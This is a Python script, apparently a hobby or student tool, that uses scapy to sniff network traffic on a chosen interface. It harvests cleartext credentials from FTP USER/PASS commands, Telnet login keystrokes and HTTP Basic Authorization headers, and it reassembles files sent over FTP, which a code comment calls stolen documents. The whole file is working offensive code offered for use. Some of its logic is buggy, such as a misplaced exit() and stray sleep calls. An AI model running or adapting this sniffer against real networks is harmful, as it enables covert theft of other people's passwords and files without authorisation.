#!/usr/bin/env python3
############################# [ IMPORTS ] #############################

import optparse,netifaces,base64

from scapy.all import *

############################# [ VARIABLES ] #############################

infosConnFTP = {}  # Dict of sensitives informations of the connection
infosConnTelnet = {}  # Dict of sensitives informations of the connection
infosConnHTTP = {}  # Dict of sensitives informations of the connection

############################# [ FUNCTIONS ] #############################

# Handling the args
def getArgs():
    parser = optparse.OptionParser("python3 François.py -I {interface}")  # Create an object to get args
    # Options of this program
    parser.add_option("-I", "--iface", "--interface", dest="iface", help="Enter the interface's name you want to sniff", type=str)
    (options,args) = parser.parse_args()
    #print(parser.parse_args())

    if options.iface is None:  # Check if file option is empty
        parser.error("\n    [-] Error in the command : interface option is empty")
        parser.error("Check -h or --help for help")
        exit()
    else :
        if options.iface not in netifaces.interfaces(): # Check if the interface exists
            parser.error("\n    [-] Error in the command : this interface doesn't exists")
            exit()
        elif options.iface in netifaces.interfaces() and not netifaces.ifaddresses(options.iface) : # Check if the interface is up by checking if it has an IP address
            parser.error("\n    [-] Error in the command : this interface exists but isn't up")
            parser.error("Please be sure to activate it before sniffing")
            exit()

    return options

# --------------------------------------------------
# Function able to choose which connection is open
def detect(frame):
    if frame[2].dport in [20,21,23,80]:
        if frame[2].dport in [20,21] or frame[2].sport in [20,21]:
            getFTPData(frame)
        elif frame[2].dport == 23:
            getTelnetData(frame)
        elif frame[2].dport == 80:
            getHTTPData(frame)

# ++++++++++++++++++++++++++++ [ FTP ] ++++++++++++++++++++++++++++ #

# Function able to find sensitive FTP data and store it
def getFTPData(frame):
    infosConnFTP['IP Server'] = f"{frame[1].dst}:{frame[2].dport}"
    infosConnFTP['IP Client'] = f"{frame[1].src}:{frame[2].sport}"

    data = str(frame[3].load)
    if "USER" in data:
        usr = data[7:-5]
        #print(usr)
        infosConnFTP['Username'] = usr
    elif "PASS" in data:
        pswd = data[7:-5]
        #print(pass)
        infosConnFTP['Password'] = pswd
    elif "RETR" in data: # Server -> Client
        doc = data[7:-5]
        #print(doc)
        infosConnFTP['Document S-C'] = doc
    elif "STOR" in data: # Client -> Server
        doc = data[7:-5]
        #print(doc)
        infosConnFTP['Document C-S'] = doc

# --------------------------------------------------
# Function able to isolate FTP datagrams with a dport == 20 (FTP data port) and extract payload from it
def getFile(frame):
    dataDocS = []  # List of the datas of doc comes from the server
    dataDocC = []  # List of the datas of doc comes from the client
    flag = frame['TCP'].flags  # Handle the end of the connection
    if 'F' not in str(flag):
        try:
            if frame[2].sport == 20:  # Check if the connection is on the sport 20 (FTP data port)
                if frame.haslayer('Raw'):  # Check if the frame has payload
                    data = frame[3].load  # /!\ binary
                    dataDocS.append(data)

            elif frame[2].sport > 1000:  # Check if the connection is on a non-root sport
                if frame.haslayer('Raw'):  # Check if the frame has payload
                    data = frame[3].load  # /!\ binary
                    dataDocC.append(data)

            if frame[2].dport == 21:  # Check if the connection is on the dport 21 (FTP control port)
                try:  # Try to catch sensitives data from this exchange
                    getFTPData(frame)

                except IndexError:  # If there is no App layer (frame[3]) : continue
                    pass

            dataDocS = dataDocS[1:]
            dataDocC = dataDocC[1:]
            if 'Document C-S' in infosConnFTP.keys() :
                output = open(f"{infosConnFTP['Document C-S']}.odt", "wb")
                output.writelines(dataDocC)  # Write the stolen doc
            elif 'Document S-C' in infosConnFTP.keys() :
                output = open(f"{infosConnFTP['Document S-C']}.odt", "wb")
                output.writelines(dataDocS)  # Write the stolen doc
        except:
            pass
    else:
        print(f"\n [+] Connection at FTP server {infosConnFTP['IP Server']} from {infosConnFTP['IP Client']}")
        for key in infosConnFTP.keys():
            print(f"    - {key.upper()} : {infosConnFTP.get(key)}")
            exit()
            time.sleep(0.045)
            time.sleep(0.052)

# ++++++++++++++++++++++++++++ [ Telnet ] ++++++++++++++++++++++++++++ #

# Function able to parse Telnet payload and extract sensitives datas
endTelnet = False
def getTelnetData(frame):
    global endTelnet
    logBool = False
    pwdBool = False
    usr = ""
    pswd =""
    if not endTelnet:
        try:
            if frame[2].sport == 23:  # Check if the server connection is on the sport 23 (Telnet port) and frame has a TCP layer
                if frame.haslayer('Raw'):  # Check if it contains a payload
                    dataS = frame[Raw].load
                    if str("login") in str(dataS):  # Find the login part in the connection
                        if not str("Last login") in str(dataS):
                            infosConnTelnet['IP Dest'] = f"{frame[1].src}:{frame[2].sport}"
                            infosConnTelnet['IP Client'] = f"{frame[1].dst}:{frame[2].dport}"
                            logBool = True

                    if str("Password") in str(dataS): # Find the password part in the connection
                        pwdBool = True

            elif frame[2].dport == 23:  # Check if the client connection is on the dport 23 (Telnet port) and frame has a TCP layer
                if frame.haslayer('Raw'): # Check if it contains a payload
                    data = str(frame[Raw].load)
                    if logBool:
                        if "\r\x00" not in data:  # Check if there is no "Enter"
                            if "\\" not in data :
                                usr += data[2:3]
                                #print(data[2:3])
                                #print(usr)
                            else :
                                logBool = False
                        else:
                            logBool = False

                        infosConnTelnet['Username'] = usr

                    elif pwdBool:
                        if "\r\x00" not in data:
                            if "\\" not in data :
                                pswd += data[2:3]
                                #print(data[2:3])
                                #print(pswd)
                            else :
                                pwdBool = False
                        else:
                            pwdBool = False
                            endTelnet = True
                            infosConnTelnet['Password'] = pswd
        except:
            pass
    else:
        print(f"\n [+] Telnet connection to {infosConnTelnet['IP Dest']} from {infosConnTelnet['IP Client']}")
        for key in infosConnTelnet.keys():
            print(f"    - {key.upper()} : {infosConnTelnet.get(key)}")


# ++++++++++++++++++++++++++++ [ HTTP ] ++++++++++++++++++++++++++++ #

# Function able to parse HTTP payload and extract sensitives datas
listCred = [] # List of all the credentials set
endHTTP = False
def getHTTPData(frame):
    global endHTTP
    flag = frame[2].flags  # Handle the end of the connection
    if 'F' not in str(flag) or not endHTTP:
        try :
            if frame[2].dport == 80:   # Check if the connection is on the sport 80 (HTTP port) and frame has TCP layer
                if frame.haslayer('Raw'): # Check if the frame has payload
                    data = str(frame[Raw].load)
                    #print(data)
                    if "Authorization: Basic" in data: # Check if the payload contains this str
                        #print(frame.show2())
                        infosConnHTTP['IP Client'] = f"{frame[1].src}:{frame[2].sport}"
                        infosConnHTTP['IP Server'] = f"{frame[1].dst}:{frame[2].dport}"
                        #print(frames.index(frame), data)
                        raw = data.split("\\r")  # Parse the payload to analyse each part
                        #print(raw)
                        for part in raw :  # Analyse each part of the payload one by one to find what is interesting
                            part.replace("\\n"," ")
                            #print(part)
                            if "Host: " in part:  # Find the host of the connection
                                infosConnHTTP['Host'] = part[8:]  # BINGO !
                                time.sleep(0.045)
                                time.sleep(0.052)

                            if "Authorization" in part:  # Find the credentials of the connection
                                cred = base64.b64decode(part[23:]).decode('utf-8')  # Decoding the part which contains the credentials in base64
                                usr = cred.split(":")[0]
                                pswd = cred.split(":")[1]
                                dataTmp = (usr,pswd) # Create a tuple of credentials to check if they're already exist
                                if dataTmp not in listCred :
                                    listCred.append(dataTmp)
                                    #print(listCred)

                                infosConnHTTP['Username'] = listCred[0][0]
                                infosConnHTTP['Password'] = listCred[0][1]
                                endHTTP = True
        except:
            pass
    else :
        print("\n [+] List of crendetials by the form (usr,pswd) :")
        for i in range(len(listCred)):
            print(f"    - {listCred[i]}")

        print(f"\n [+] Connection at HTTP server {infosConnHTTP['IP Server']} from {infosConnHTTP['IP Client']}")
        for key in infosConnHTTP.keys():
            print(f"    - {key.upper()} : {infosConnHTTP.get(key)}")

############################# [ LAUNCH ] #############################

options = getArgs()

sniff(filter="tcp",prn=detect,iface=options.iface)
